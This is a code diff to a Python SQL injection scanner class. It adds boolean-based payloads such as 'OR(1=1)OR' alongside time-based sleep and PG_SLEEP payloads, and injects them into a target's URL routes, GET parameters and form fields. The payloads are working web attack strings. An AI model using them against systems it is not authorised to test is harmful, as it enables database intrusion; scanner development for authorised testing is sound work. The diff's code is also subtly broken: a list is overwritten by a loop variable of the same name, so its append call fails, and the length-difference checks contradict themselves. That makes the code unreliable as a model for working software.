@@ -20,7 +20,6 @@ class SqliManager:
         self._false_positives = ['malformed request syntax',
                                  'eval|internal|range|reference|syntax|type']
         self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
-        # self._error_based_payloads = []
         self._time_based_payloads = [
             {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\'',
              'True2Pld': '\'OR(if(2=2,sleep(5),0))OR\''},
@@ -32,6 +31,11 @@ class SqliManager:
              'FalsePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(0)) OR \'',
              'True2Pld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(6)) OR \''},
         ]
+        self._bool_based_payloads = [
+            {'TruePld': '\'OR(1=1)OR\'', 'FalsePld': '\'OR(1=2)OR\'', 'True2Pld': '\'OR(2=2)OR\''},
+            {'TruePld': '"OR(1=1)OR"', 'FalsePld': '"OR(1=2)OR"', 'True2Pld': '"OR(2=2)OR"'}
+        ]
+        self._bool_diff_rate = 0.1
         self._delay_in_seconds = 5
         self._request_handler = RequestHandler(cookies, headers)
         self._injections_to_check = [' syntax', 'xpath', 'internalerror', 'exception: ']
@@ -103,6 +107,8 @@ class SqliManager:
                             copy_form_params[param] = prev_param
                     for payloads in self._time_based_payloads:
                         self.__send_form_time_based(payloads, form.params, param, dto.url)
+                    for payloads in self._bool_based_payloads:
+                        self.__send_form_bool_based(payloads, form.params, param, dto.url)
 
             elif form.method_type == "GET":
                 parsed = urlparse.urlparse(dto.url)
@@ -137,17 +143,17 @@ class SqliManager:
                 print("METHOD TYPE NOT FOUND: " + form.method_type)
                 return
 
-    def __get_route_time_based_payloads(self, url: str) -> List[List[str]]:
+    def __get_route_payloads(self, url: str, injections: []) -> List[List[str]]:
 
         parsed = urllib.parse.urlparse(url)
         route_parts = [r for r in parsed.path.split('/') if r.strip()]
-        route_time_based_payloads = []
+        payloads = []
         for index, part in enumerate(route_parts):
 
             if self._request_checker.is_route_checked(url, part):
                 continue
 
-            for payloads in self._time_based_payloads:
+            for payloads in injections:
                 payload_part = f'{part}{payloads["TruePld"]}'
                 new_route_parts = deepcopy(route_parts)
                 new_route_parts[index] = payload_part
@@ -163,38 +169,38 @@ class SqliManager:
                 new_route_parts[index] = payload_part
                 true2_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
 
-                route_time_based_payloads.append([true_new_url, false_new_url, true2_new_url])
+                payloads.append([true_new_url, false_new_url, true2_new_url])
 
-        return route_time_based_payloads
+        return payloads
 
     def __check_url(self, dto: GetRequestDTO):
 
         route_url_payloads = self._request_checker.get_route_payloads(dto.url, self._error_based_payloads)
-        route_time_based_payloads = self.__get_route_time_based_payloads(dto.url)
+        route_time_based_payloads = self.__get_route_payloads(dto.url, self._time_based_payloads)
+        route_bool_based_payloads = self.__get_route_payloads(dto.url, self._bool_based_payloads)
 
         for url in route_url_payloads:
             self.__send_error_based_request(url, dto)
 
         for payloads in route_time_based_payloads:
+            self.__send_time_based_request(payloads[0], payloads[1], payloads[2])
 
-            if len(payloads) == 3:
-                self.__send_time_based_request(payloads[0], payloads[1], payloads[2])
-            else:
-                print(f'Error: ({dto.url}) time based payloads wrong generation')
+        for payloads in route_bool_based_payloads:
+            self.__send_bool_based_request(payloads[0], payloads[1], payloads[2])
 
-    def __get_time_based_param_payloads(self, url: str) -> set[tuple[str, str, str]]:
+    def __get_param_payloads(self, url: str, injections: [], salt) -> set[tuple[str, str, str]]:
         time_based_payloads_urls = set()
         parsed = urlparse.urlparse(url)
         params_key_values = filter(None, parsed.query.split("&"))
 
         for param_k_v in params_key_values:
 
-            if self._request_checker.is_get_param_checked(url, param_k_v):
+            if self._request_checker.is_get_param_checked(url, param_k_v, salt):
                 continue
 
             param_split = param_k_v.split('=')
             main_url_split = url.split(param_k_v)
-            for payloads in self._time_based_payloads:
+            for payloads in injections:
                 time_based_payloads_urls.add(
                     (f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
                      f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}',
@@ -204,14 +210,18 @@ class SqliManager:
 
     def __check_get_params(self, dto: GetRequestDTO):
 
-        error_based_payloads_urls = self._request_checker.get_param_payloads(dto.url, self._error_based_payloads)
-        time_based_payloads_urls = self.__get_time_based_param_payloads(dto.url)
+        error_based_payloads_urls = self._request_checker.get_param_payloads(dto.url, self._error_based_payloads, 'sqliE')
+        time_based_payloads_urls = self.__get_param_payloads(dto.url, self._time_based_payloads, 'sqliT')
+        bool_based_payloads_urls = self.__get_param_payloads(dto.url, self._bool_based_payloads, 'sqliB')
 
         for payload in error_based_payloads_urls:
             self.__send_error_based_request(payload, dto)
 
         for payloads in time_based_payloads_urls:
             self.__send_time_based_request(payloads[0], payloads[1], payloads[2])
+
+        for payloads in bool_based_payloads_urls:
+            self.__send_bool_based_request(payloads[0], payloads[1], payloads[2])
 
     def __send_error_based_request(self, url, dto: GetRequestDTO):
         try:
@@ -224,27 +234,60 @@ class SqliManager:
         except Exception as inst:
             print(f"Exception - ({url}) - {inst}")
 
+    def __send_bool_based_request(self, true_payload, false_payload, true2_payload):
+        true_response = self._request_handler.handle_request(true_payload)
+        true_status = true_response.status_code
+        true_length = len(true_response.text)
+        if true_length == 0:
+            true_length = 1
+
+        false_response = self._request_handler.handle_request(false_payload)
+        false_status = false_response.status_code
+        false_length = len(false_response.text)
+
+        if abs(true_length - false_length) / true_length > self._bool_diff_rate or true_length != false_length:
+            true2_response = self._request_handler.handle_request(true2_payload)
+            true2_length = len(true2_response.text)
+            if true2_length == 0:
+                true2_length = 1
+
+            if abs(true_length - true2_length) / true_length > self._bool_diff_rate or true_length == true2_length:
+                msg = f"SQLiManager bool PARAM length! TRUE:{true_payload} ; FALSE:{false_payload}"
+                print(msg)
+                return self._result.append(
+                    InjectionFoundDTO(InjectionType.Sqli_Get_Bool, true_payload,
+                                      'BOOL_BASED', 'RESPONSE1 is NONE', msg))
+        elif true_status != false_status:
+            true2_response = self._request_handler.handle_request(true2_payload)
+            true2_status = true2_response.status_code
+            if true_status == true2_status:
+                msg = f"SQLiManager bool PARAM status_code! TRUE:{true_payload} ; FALSE:{false_payload}"
+                print(msg)
+                return self._result.append(
+                    InjectionFoundDTO(InjectionType.Sqli_Get_Bool, true_payload,
+                                      'BOOL_BASED', 'RESPONSE1 is NONE', msg))
+
     def __send_time_based_request(self, true_payload, false_payload, true_2payload):
         t1 = datetime.now()
-        response1 = self._request_handler.handle_request(true_payload)
+        self._request_handler.handle_request(true_payload)
         t2 = datetime.now() - t1
-        if response1 is None and t2.total_seconds() >= self._delay_in_seconds:
+        if t2.total_seconds() >= self._delay_in_seconds:
             t1 = datetime.now()
-            response2 = self._request_handler.handle_request(false_payload)
+            self._request_handler.handle_request(false_payload)
             t2 = datetime.now() - t1
-            if response2 is not None and t2.total_seconds() < self._delay_in_seconds:
+            if t2.total_seconds() < self._delay_in_seconds:
                 t1 = datetime.now()
-                response3 = self._request_handler.handle_request(true_2payload)
+                self._request_handler.handle_request(true_2payload)
                 t2 = datetime.now() - t1
-                if response3 is None and t2.total_seconds() >= self._delay_in_seconds:
+                if t2.total_seconds() >= self._delay_in_seconds:
                     t1 = datetime.now()
-                    response4 = self._request_handler.handle_request(false_payload)
+                    self._request_handler.handle_request(false_payload)
                     t2 = datetime.now() - t1
-                    if response4 is not None and t2.total_seconds() < self._delay_in_seconds:
+                    if t2.total_seconds() < self._delay_in_seconds:
                         t1 = datetime.now()
-                        response5 = self._request_handler.handle_request(true_payload)
+                        self._request_handler.handle_request(true_payload)
                         t2 = datetime.now() - t1
-                        if response5 is None and t2.total_seconds() >= self._delay_in_seconds:
+                        if t2.total_seconds() >= self._delay_in_seconds:
                             msg = f"SQLiManager delay FOUND! TRUE:{true_payload} ; FALSE:{false_payload}"
                             print(msg)
                             return self._result.append(
@@ -299,39 +342,79 @@ class SqliManager:
         copy_form_params = deepcopy(form_params)
         copy_form_params[param] = payloads["TruePld"]
         t1 = datetime.now()
-        response1 = self._request_handler.handle_request(url, post_data=copy_form_params)
+        self._request_handler.handle_request(url, post_data=copy_form_params)
         t2 = datetime.now() - t1
-        if response1 is None and t2.total_seconds() >= self._delay_in_seconds:
+        if t2.total_seconds() >= self._delay_in_seconds:
 
             copy_form_params = deepcopy(form_params)
             copy_form_params[param] = payloads["FalsePld"]
             t1 = datetime.now()
             response2 = self._request_handler.handle_request(url, post_data=copy_form_params)
             t2 = datetime.now() - t1
-            if response2 is not None and t2.total_seconds() < self._delay_in_seconds:
+            if t2.total_seconds() < self._delay_in_seconds:
 
                 copy_form_params = deepcopy(form_params)
                 copy_form_params[param] = payloads["True2Pld"]
                 t1 = datetime.now()
-                response3 = self._request_handler.handle_request(url, post_data=copy_form_params)
+                self._request_handler.handle_request(url, post_data=copy_form_params)
                 t2 = datetime.now() - t1
-                if response3 is None and t2.total_seconds() >= self._delay_in_seconds:
+                if t2.total_seconds() >= self._delay_in_seconds:
 
                     copy_form_params = deepcopy(form_params)
                     copy_form_params[param] = payloads["FalsePld"]
                     t1 = datetime.now()
-                    response4 = self._request_handler.handle_request(url, post_data=copy_form_params)
+                    self._request_handler.handle_request(url, post_data=copy_form_params)
                     t2 = datetime.now() - t1
-                    if response4 is not None and t2.total_seconds() < self._delay_in_seconds:
+                    if t2.total_seconds() < self._delay_in_seconds:
 
                         copy_form_params = deepcopy(form_params)
                         copy_form_params[param] = payloads["TruePld"]
                         t1 = datetime.now()
-                        response5 = self._request_handler.handle_request(url, post_data=copy_form_params)
+                        self._request_handler.handle_request(url, post_data=copy_form_params)
                         t2 = datetime.now() - t1
-                        if response5 is None and t2.total_seconds() >= self._delay_in_seconds:
+                        if t2.total_seconds() >= self._delay_in_seconds:
                             msg = f"SqliManager FORM delay FOUND! TRUE:{payloads['TruePld']} ; FALSE:{payloads['FalsePld']}"
                             print(msg)
                             self._result.append(
                                 InjectionFoundDTO(InjectionType.Sqli_PostForm_Time, url, copy_form_params,
                                                   response2.text, msg))
+
+    def __send_form_bool_based(self, payloads, form_params, param, url):
+        copy_form_params = deepcopy(form_params)
+        copy_form_params[param] = payloads["TruePld"]
+        true_response = self._request_handler.handle_request(url, post_data=copy_form_params)
+        true_length = len(true_response.text)
+        true_status = true_response.status_code
+        if true_length == 0:
+            true_length = 1
+
+        copy_form_params = deepcopy(form_params)
+        copy_form_params[param] = payloads["FalsePld"]
+        false_response = self._request_handler.handle_request(url, post_data=copy_form_params)
+        false_status = false_response.status_code
+        false_length = len(false_response.text)
+
+        if abs(true_length - false_length) / true_length > self._bool_diff_rate or true_length != false_length:
+            copy_form_params = deepcopy(form_params)
+            copy_form_params[param] = payloads["True2Pld"]
+            true2_response = self._request_handler.handle_request(url, post_data=copy_form_params)
+            true2_length = len(true2_response.text)
+            if true2_length == 0:
+                true2_length = 1
+
+            if abs(true_length - true2_length) / true_length > self._bool_diff_rate or true_length == true2_length:
+                msg = f"SqliManager bool FORM size! TRUE:{payloads['TruePld']} ; FALSE:{payloads['FalsePld']}"
+                print(msg)
+                self._result.append(
+                    InjectionFoundDTO(InjectionType.Sqli_PostForm_Bool, url, copy_form_params, true2_response.text, msg))
+
+        elif true_status != false_status:
+            copy_form_params = deepcopy(form_params)
+            copy_form_params[param] = payloads["True2Pld"]
+            true2_response = self._request_handler.handle_request(url, post_data=copy_form_params)
+            true2_status = true2_response.status_code
+            if true_status == true2_status:
+                msg = f"SQLiManager bool FORM status_code! TRUE:{payloads['TruePld']} ; FALSE:{payloads['FalsePld']}"
+                print(msg)
+                self._result.append(
+                    InjectionFoundDTO(InjectionType.Sqli_PostForm_Bool, url, copy_form_params, true2_response.text, msg))
